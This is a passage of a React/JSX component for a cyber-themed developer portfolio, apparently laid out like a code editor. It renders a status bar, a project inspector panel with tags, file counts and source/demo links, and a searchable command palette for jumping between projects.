            {/* status bar */}
            <div className="flex items-center justify-between gap-3 border-t border-glass-border/60 bg-cyber-cyan/[0.05] px-3 py-1 font-mono text-[10px] uppercase tracking-wider text-muted-foreground">
              <div className="flex items-center gap-3">
                <span className="text-cyber-cyan">● {activeProject.status}</span>
                <span>{activeProject.domain}</span>
                <span>{currentFile.lang}</span>
                <span>{lines.length} lines</span>
              </div>
              <div className="hidden items-center gap-3 sm:flex">
                <span>UTF-8</span>
                <span>LF</span>
                <span>spaces: 2</span>
              </div>
            </div>
          </main>

          {/* inspector — desktop only */}
          <aside className="hidden overflow-y-auto border-l border-glass-border/60 bg-black/30 p-4 lg:block">
            <div className="font-mono text-[10px] uppercase tracking-[0.25em] text-cyber-cyan">
              inspector
            </div>
            <h3 className="mt-3 font-display text-base font-semibold leading-tight">
              {activeProject.name}
            </h3>
            <div className="mt-1 flex items-center gap-2 font-mono text-[10px] uppercase tracking-wider text-muted-foreground">
              <span className={cn("h-1.5 w-1.5 rounded-full", STATUS_COLOR[activeProject.status])} />
              {activeProject.status}
              <span>·</span>
              {activeProject.domain}
            </div>
            <p className="mt-3 text-xs text-muted-foreground">{activeProject.description}</p>

            {activeProject.image && (
              <div className="mt-3 overflow-hidden rounded-md ring-1 ring-glass-border">
                <img src={activeProject.image} alt={activeProject.name} className="h-24 w-full object-cover" loading="lazy" />
              </div>
            )}

            <div className="mt-4">
              <div className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">
                <Tag className="mr-1 inline h-3 w-3" />tags
              </div>
              <div className="mt-2 flex flex-wrap gap-1">
                {activeProject.tags.map((t) => (
                  <span key={t} className="rounded border border-cyber-cyan/30 bg-cyber-cyan/5 px-1.5 py-0.5 font-mono text-[9px] text-cyber-cyan">
                    #{t}
                  </span>
                ))}
              </div>
            </div>

            <div className="mt-4">
              <div className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">
                files
              </div>
              <div className="mt-2 font-mono text-[10px] text-muted-foreground">
                {activeProject.files.length} files · {activeProject.files.reduce((s, f) => s + f.content.split("\n").length, 0)} LOC
              </div>
            </div>

            <div className="mt-4 space-y-2">
              {activeProject.github && (
                <a
                  href={activeProject.github}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="inline-flex w-full items-center justify-center gap-1.5 rounded-md border border-border bg-black/40 px-2 py-1.5 font-mono text-[10px] uppercase tracking-wider text-foreground hover:border-cyber-cyan/40 hover:text-cyber-cyan"
                >
                  <Github className="h-3 w-3" />
                  source
                </a>
              )}
              {activeProject.demo && (
                <a
                  href={activeProject.demo}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="inline-flex w-full items-center justify-center gap-1.5 rounded-md border border-border bg-black/40 px-2 py-1.5 font-mono text-[10px] uppercase tracking-wider text-foreground hover:border-cyber-cyan/40 hover:text-cyber-cyan"
                >
                  <ExternalLink className="h-3 w-3" />
                  demo
                </a>
              )}
              {activeProject.status === "private" && (
                <div className="rounded-md border border-cyber-violet/30 bg-cyber-violet/5 p-2 font-mono text-[10px] uppercase tracking-wider text-cyber-violet">
                  <Lock className="mr-1 inline h-3 w-3" />
                  classified · contact required
                </div>
              )}
            </div>
          </aside>
        </div>
      </div>

      {/* command palette */}
      <AnimatePresence>
        {showPalette && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 grid place-items-start bg-background/80 p-4 pt-32 backdrop-blur-sm"
            onClick={() => setShowPalette(false)}
          >
            <motion.div
              initial={{ y: -10, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              exit={{ y: -10, opacity: 0 }}
              transition={{ duration: 0.15 }}
              onClick={(e) => e.stopPropagation()}
              className="mx-auto w-full max-w-xl overflow-hidden rounded-xl ring-1 ring-glass-border"
              style={{ background: "oklch(0.12 0.02 265 / 0.95)" }}
            >
              <div className="flex items-center gap-2 border-b border-glass-border/60 px-3 py-2">
                <Search className="h-4 w-4 text-muted-foreground" />
                <input
                  autoFocus
                  value={paletteQuery}
                  onChange={(e) => setPaletteQuery(e.target.value)}
                  placeholder="Jump to project, tag, or domain..."
                  className="w-full bg-transparent font-mono text-sm outline-none placeholder:text-muted-foreground/60"
                />
                <kbd className="rounded border border-border px-1.5 py-0.5 font-mono text-[9px] text-muted-foreground">esc</kbd>
              </div>
              <ul className="max-h-80 overflow-y-auto p-1">
                {paletteResults.map((p) => {
                  const Icon = DOMAIN_ICON[p.domain];
                  return (
                    <li key={p.id}>
                      <button
                        onClick={() => {
                          openProject(p.id);
                          setShowPalette(false);
                          setPaletteQuery("");
                        }}
                        className="flex w-full items-center gap-3 rounded-md px-3 py-2 text-left hover:bg-muted/30"
                      >
                        <Icon className="h-4 w-4 text-cyber-cyan" />
                        <span className="font-display text-sm">{p.name}</span>
                        <span className="ml-auto font-mono text-[10px] uppercase tracking-wider text-muted-foreground">
                          {p.domain}
                        </span>
                      </button>
                    </li>
                  );
                })}
                {paletteResults.length === 0 && (
                  <li className="px-3 py-4 text-center text-sm text-muted-foreground">
                    No matches.
                  </li>
                )}
              </ul>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
